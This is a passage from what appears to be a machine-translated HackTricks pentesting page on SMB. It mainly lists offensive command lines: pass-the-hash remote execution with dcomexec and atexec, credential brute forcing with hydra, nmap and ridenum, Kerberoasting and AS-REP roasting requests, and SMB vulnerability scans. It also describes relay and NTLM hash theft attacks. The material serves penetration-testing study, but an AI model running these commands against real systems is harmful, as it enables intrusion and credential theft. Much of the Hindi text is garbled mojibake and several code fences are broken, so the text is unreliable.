#рдЕрдЧрд░ рдХреЛрдИ рдкрд╛рд╕рд╡рд░реНрдб рдирд╣реАрдВ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ рдкреВрдЫрд╛ рдЬрд╛рдПрдЧрд╛
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #рдкрд╛рд╕-рдж-рд╣реИрд╢
#рдЖрдк рдЗрд╕ рдХрдорд╛рдВрдб рдХреЗ рдЕрдВрдд рдореЗрдВ рдПрдХ CMD рдХрдорд╛рдВрдб рдЬреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреЛ рдЖрдк рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдПрдХ рдЕрд░реНрдз-рд╕рдВрд╡рд╛рджрд╛рддреНрдордХ рд╢реИрд▓ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛
```

### [AtExec](../windows-hardening/ntlm/atexec.md)

Execute commands via the Task Scheduler (using _\pipe\atsvc_ via SMB).\
In **kali** it is located on /usr/share/doc/python3-impacket/examples/

```bash
```
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```

```
./atexec.py [[рдбреЛрдореЗрди/]рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛[:рдкрд╛рд╕рд╡рд░реНрдб]@]<рд▓рдХреНрд╖рд┐рддрдирд╛рдо рдпрд╛ рдкрддрд╛> "рдХрдорд╛рдВрдб"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
```

## Impacket reference

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

## **Bruteforce users credentials**

**This is not recommended, you could block an account if you exceed the maximum allowed tries**

```bash
```
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдЬрд┐рдирдХреЗ рд░рд┐рдбреНрд╕ рдХреЛ bruteforcing рдХрд░рдХреЗ рдФрд░ рдлрд┐рд░ рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЛ bruteforce рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ
```
```

## SMB relay attack

This attack uses the Responder toolkit to **capture SMB authentication sessions** on an internal network, and **relays** them to a **target machine**. If the authentication **session is successful**, it will automatically drop you into a **system** **shell**.\
[**More information about this attack here.**](../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

The Windows library URLMon.dll automatically try to authenticaticate to the host when a page tries to access some contect via SMB, for example: `img src="\\10.10.10.10\path\image.jpg"`

This happens with the functions:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

Which are used by some browsers and tools (like Skype)

![From: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (93).png>)

### SMBTrap using MitMf

![From: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (94).png>)

## NTLM Theft

Similar to SMB Trapping, planting malicious files onto a target system (via SMB, for example) can illicit an SMB authentication attempt, allowing the NetNTLMv2 hash to be intercepted with a tool such as Responder. The hash can then be cracked offline or used in an [SMB relay attack](pentesting-smb.md#smb-relay-attack).

[See: ntlm\_theft](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm\_theft)

## HackTricks Automatic Commands

```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: рдиреЛрдЯреНрд╕
Description: SMB рдХреЗ рд▓рд┐рдП рдиреЛрдЯреНрд╕
Note: |
рдЬрдмрдХрд┐ рдкреЛрд░реНрдЯ 139 рдХреЛ рддрдХрдиреАрдХреА рд░реВрдк рд╕реЗ 'NBT over IP' рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдкреЛрд░реНрдЯ 445 'SMB over IP' рд╣реИред SMB рдХрд╛ рдорддрд▓рдм рд╣реИ 'рд╕рд░реНрд╡рд░ рдореИрд╕реЗрдЬ рдмреНрд▓реЙрдХреНрд╕'ред рдЖрдзреБрдирд┐рдХ рднрд╛рд╖рд╛ рдореЗрдВ рд╕рд░реНрд╡рд░ рдореИрд╕реЗрдЬ рдмреНрд▓реЙрдХ рдХреЛ рд╕рд╛рдорд╛рдиреНрдп рдЗрдВрдЯрд░рдиреЗрдЯ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╕рд┐рд╕реНрдЯрдо рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди-рд▓реЗрдпрд░ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдкреНрд░рдпреЛрдЧ рдлрд╝рд╛рдЗрд▓реЛрдВ, рдкреНрд░рд┐рдВрдЯрд░реЛрдВ, рд╕реАрд░рд┐рдпрд▓ рдкреЛрд░реНрдЯреНрд╕ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдиреЛрдбреЛрдВ рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рд╕рд╛рдЭрд╛ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

#рдореИрдВ рд╣рд░ рдмрд╛рд░ рдЬрдм рднреА рдЦреБрд▓рд╛ SMB рдкреЛрд░реНрдЯ рджреЗрдЦрддрд╛ рд╣реВрдБ рддреЛ рдпреЗ рдХрдорд╛рдВрдб рдЪрд▓рд╛рддрд╛ рд╣реВрдБ

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb

Entry_2:
Name: Enum4Linux
Description: рд╕рд╛рдорд╛рдиреНрдп SMB рд╕реНрдХреИрди
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB рд╕реНрдХреИрди 1
Description: Nmap рдХреЗ рд╕рд╛рде SMB Vuln рд╕реНрдХреИрди
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb рд╕реНрдХреИрди 2
Description: Nmap рдХреЗ рд╕рд╛рде SMB Vuln рд╕реНрдХреИрди (рдХрдо рд╡рд┐рд╢рд┐рд╖реНрдЯ)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: рд╣рд╛рдЗрдбреНрд░рд╛ рдмреНрд░реВрдЯ рдлрд╝реЛрд░реНрд╕
Description: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 рдХрдВрд╕реЛрд▓реНрд╕рд▓реЗрд╕ рдПрдордПрдлрдПрд╕ рдЬрд╛рдВрдЪ
Description: рдПрдордПрдлрдПрд╕ рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ SMB/SMB2 139/445 рдЬрд╛рдВрдЪ
Note: https://github.com/carlospolop/legion рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'
```

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
